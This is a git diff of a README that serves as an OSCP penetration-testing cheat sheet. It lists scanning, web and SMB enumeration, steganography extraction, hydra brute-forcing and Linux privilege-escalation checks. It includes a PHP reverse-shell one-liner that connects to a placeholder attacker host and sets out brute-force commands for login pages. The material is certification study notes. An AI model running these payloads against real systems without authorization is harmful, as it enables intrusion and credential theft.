@@ -1,11 +1,6 @@
 # OSCP-Cheatsheet
-The essential Kao list for OSCP  
-`test`  
-[test](https://www.geeksforgeeks.org/what-is-readme-md-file/) 
-```javascript
-sudo nmap -sS <IP adress>
-```
-> test  
+The essential tools and procedure Kaoryu for OSCP  
+You can find important upload on top of page
 ## Global RoadMap for Pentest _For Linux_
 ### 1. Passive recognition
  - Command helpful for passive recognition 
@@ -20,6 +15,7 @@ nslookup -type=MX nomdedomaine.exemple <IP address>
  - 2 sites more helpful and wider than command  
    [DNSdumper.com](DNSdumper.com) and [Shodan.io](Shodan.io)
 ### 2. System enumeration
+#### 2.1 Scan Port
  - **Nmap** and these most useful parameters
 ```bash
 nmap -sS <IP address>
@@ -52,7 +48,92 @@ sudo nmap -sS -oG <foldername> <IP address>
 sudo nmap -sN -oG NOM_DU_FICHIER <IP address>
 #use -sN for the null Flag and don't be detect by IPS
 ```
-### 3. Exploit / Try to get a shell
-### 4. escalation privilege
+#### 2.2 HTTP/S enumeration
+- port 80 http and port 443 https
+- Inspect source code, request http, cookies, and storage in application,...
+- If a image look suspicious dowload it and use steganography
+```bash
+binwalk <image.jpg>
+#allow to see if a other folder is hide in image
+binwalk -e <image.jpg> 
+#extract hidden data
+stegide extract -sf <image.jpg> -p <passphrase>
+#allow to extract data lock with password
+stegseek <image.jpg> /usr/share/wordlists/rockyou.txt
+#brute force the password of date 
+```
+- Common http directory `/robots.txt`,`/images`,`/admin`,`/bin`,`/cgi-bin`,`/stats`,`/icons`,`/doc`,`/docs`
+- We can automatize enumeration 
+```bash
+gobuster dir -u http://<IP address> -w /usr/share/worldist.txt -x txt,xml,js,css,html,php
+ffuf -u http://<IP address>/FUZZ -w /usr/share/worldist.txt -p "0.1" -H "Name:Value" (-H = Header)
+#scan wide hidden directory 
+nikto -h http://<IP address>
+#in addition to gobuster or ffuf scan
+```
+#### 2.3 SMB enumeration
+- port 445 by default
+```bash
+#enum4linux -a http://<IP address>
+enumeration of SMB server
+```
+#### 2.4 SSH enumeration
+- port 22 by default
+```bash
+telnet <IP address> 22
+#use telnet (TCP/IP text) to communicate with ssh 
+```
+### 3. Exploit
+#### Reverse shell
+- reverse shell linux [hacktricks.xyz/reverse-shells/linux](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
+```php
+<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");
+#simple balise php
+```
+#### Password bruteforce
+- before bruteforce prefer to find a valid username because combination of bruteforce username and password is very very long
+```bash
+hydra -l <username> -P /usr/share/worldist.txt <IP address> http-post-form "/login:login=^USER^&password=^PASS^:message_erreur" #header parameters
+#allow to brutforce http page
+hydra -s <port> -l <username> -P /usr/share/worldist.txt -t 64 -vV -f <protocol>://<adresse IP>
+#syntax of hydra
+```
+#### hashcracking
+### 4. escalation privilege LINUX
+- You need to search about kernel version, user and group, services, logs, host directory,.... 
+- see the important location file in documents of this page
+```bash
+uname -a
+#give name of host and kernel
+id
+#name and group user
+sudo -l
+#allow look if user have permission to use sudo
+getcap -r / 2>/dev/null
+#list user capabilities
+find / -type f -perm -04000 -ls 2>/dev/null
+#list folder with SUID or GUID
+cat /etc/crontab
+#list user crontrab (they can be modifed for be execute by root)
+```
+- if there are SUID ou GUID look [gtfobins.io](https://gtfobins.github.io/)
+- for tansfer script or folder with server/attacker machine :
+```bash
+nc -q 0 <adress IP of owner folder> 1234 > script.sh
+#netcat for the machine who want the script
+scp script.sh <user>@<IP address>:/example/script.sh 
+#use scp to download script on other machine
+
+#Don't forget to give permission to execute script
+chmod +x script.sh
+```
+- can automatize enumeration system with [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) or [LinEnum.sh](https://github.com/rebootuser/LinEnum)
+```bash
+./linpeas.sh
+```
+### 5. escalation privilege WINDOWS
+## Important tools
+### Burpsuite
+### wireshark
 
   
